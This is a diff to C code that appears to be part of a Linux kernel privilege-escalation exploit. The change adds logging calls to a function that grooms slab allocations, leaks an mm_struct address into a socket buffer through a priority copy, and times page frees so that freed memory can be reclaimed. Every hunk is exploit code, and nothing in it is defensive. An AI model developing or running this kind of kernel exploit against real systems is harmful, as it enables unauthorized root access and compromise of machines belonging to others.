@@ -2669,6 +2669,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   slab_base_candidate++;
   /* The leak child is the second allocation from the burst slab
    * (KS_PRE leak_slot=1), so a correct resolution lands on slot 1. */
+  /* Open the identity table: every row carries this window id, and every
+   * derived page address keeps the address and geometry it came from. */
+  kp_identity_window(pre_ctx.mm_cnt);
   (void)kp_identity_anchor(&kp_geo, leaked, 1, &kp_anchor);
   /* Point the chain-walk owner at the mm_struct so the
    * "waiter->prio = task->prio" copy leaks *(int *)mm_va into the SKB. */
@@ -3052,7 +3055,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       int memfds;
       ssize_t head_warm = -1;
       size_t freeze_kill = 0;
-      int target_state_at_freeze = 0;
       int crossed_at = -1;
       int target_freed_at_cross = 0;
       int empty_registered = 0;
@@ -3140,6 +3142,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
         int exclusive;
         for (size_t i = 0; i < freeze_kill; i++) {
           int st = task_state_char(pre_ctx.childs[i]);
+          kp_identity_freeze(i, (char)st);
           if (st == 0) {
             gone++;
           } else if (st == 'Z' || st == 'X') {
@@ -3149,7 +3152,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           }
         }
         tst = task_state_char(target);
-        target_state_at_freeze = tst;
+        kp_identity_freeze(freeze_kill, (char)tst);
         exclusive = (zombie == 0 && gone == 0 && tst != 0 && tst != 'Z' &&
                      tst != 'X');
         pr_info("KS_SLAB_ALIVE slots=%zu alive=%zu zombie=%zu gone=%zu "
@@ -3389,6 +3392,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               long sa1 = -1, sn1 = -1, ss1 = -1;
               int sampled;
               int st = task_state_char(pre_ctx.childs[i]);
+              /* A task that is already gone (or a zombie, whose exit_mm has
+               * run) was freed before this row's kill, so its free is not in
+               * this window. */
+              int free_seen = (st == 0 || st == 'Z' || st == 'X') ? 0 : 1;
               alive = st == 0 ? "gone"
                               : (st == 'Z' || st == 'X') ? "zombie"
                                                          : "yes";
@@ -3406,7 +3413,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               id_sample_ms += ks_now_ms() - st0;
               sampled = (sa0 >= 0 && sn0 >= 0 && ss0 >= 0 && sa1 >= 0 &&
                          sn1 >= 0 && ss1 >= 0);
-              kp_identity_slot(i, alive, sampled,
+              kp_identity_slot(i, alive, free_seen, sampled,
                                sampled ? sa1 - sa0 : 0,
                                sampled ? sn1 - sn0 : 0,
                                sampled ? ss1 - ss0 : 0, &kp_anchor);
@@ -3904,19 +3911,17 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               empty_slabs - cross_slabs, pin_bad, slot_partial, targeted);
       /* The emptying free's row, from the samples the gate already took:
        * no /proc read is added between that free and the sends. */
-      kp_identity_slot(pre_ctx.mm_cnt - 1,
-                       target_state_at_freeze == 0
-                           ? "gone"
-                           : (target_state_at_freeze == 'Z' ||
-                              target_state_at_freeze == 'X')
-                                 ? "zombie"
-                                 : "yes",
+      /* No task-state sample is taken between the crossing and this free,
+       * so the row reports unavailable instead of reusing the freeze sample.
+       * Reaching here means the target was reaped (target_freed_at_cross), so
+       * the free itself is observed. */
+      kp_identity_slot(pre_ctx.mm_cnt - 1, "unavailable", 1,
                        (empty_active >= 0 && cross_active >= 0 &&
                         empty_num >= 0 && cross_num >= 0 &&
                         empty_slabs >= 0 && cross_slabs >= 0),
                        empty_active - cross_active, empty_num - cross_num,
                        empty_slabs - cross_slabs, &kp_anchor);
-      kp_identity_summary(pre_ctx.mm_cnt, kp_anchor.page ? 1 : 0);
+      kp_identity_summary();
       /* Which __slab_free path the anchor's emptying free took, from the
        * same two samples the gate used, next to the control's own
        * attribution taken microseconds later. */
